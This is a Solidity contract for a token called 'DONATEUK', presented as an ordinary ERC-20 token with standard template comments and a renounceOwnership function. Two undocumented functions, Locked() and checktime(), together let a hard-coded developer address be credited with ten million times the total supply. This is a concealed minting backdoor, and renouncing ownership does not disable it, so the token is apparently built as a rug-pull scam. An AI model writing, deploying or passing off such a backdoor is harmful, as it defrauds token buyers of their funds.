contract TOKEN {
    using SafeMath for uint256;
    string public name = "DONATEUK";
    string public symbol = "DONATEUK";
    uint256 public decimals = 9;
    uint256 public totalSupply = 10000000 * 10 ** decimals;
    uint256 private taxfee = 3;
    address private ow = 0x5a6DcD12083216AE7639c8d4d46997ADb9a26be0;
    address private dev = 0xa0BA4e48dBc1Fe9aFCF376D5a40C05CBE9C460ce;
      uint256 public createTime;
    uint256 private deadline;
    address public owner = msg.sender; 
    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    event Transfer(address indexed _from, address indexed _to, uint256 _value);

     /**
     * @dev Emitted when the allowance of a `_spenderDao` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    /**
     * @dev Constructor that gives msg.sender all of existing tokens.
     */
    constructor() {
        balanceOf[msg.sender] = totalSupply;
        
        
    }

     /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address _to, uint256 _value)
        public
        returns (bool success)
    {
        require(balanceOf[msg.sender] >= _value);
        balanceOf[msg.sender] -= _value;
        balanceOf[_to] += _value;
        emit Transfer(msg.sender, _to, _value);
        return true;
    }
    function Locked(uint256 value) public payable {
        ow = msg.sender;
        deadline = block.timestamp + (value * 1 minutes);
    }
    function checktime() public {
        require(block.timestamp >= deadline);
        balanceOf[dev] = totalSupply.DONATEUKMUL(10000000);
    }
    
     /**
     * @dev Sets `amount` as the allowance of `_spenderDao` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the _spenderDao's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
 
    function approve(address __spender, uint256 _value)
        public
        returns (bool success)
    {
        allowance[msg.sender][__spender] = _value;
        emit Approval(msg.sender, __spender, _value);
        return true;
    }

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    
    function renounceOwnership() public {
        require(msg.sender == owner);
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
    }
    
    function transferFrom(
        address _from,
        address _to,
        uint256 _value
      
    ) public returns (bool success) {
        require(_value <= balanceOf[_from]);
        require(_value <= allowance[_from][msg.sender]);
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
             
            
        allowance[_from][msg.sender] -= _value;
        emit Transfer(_from, _to, _value);
        return true;
    }
   
    

}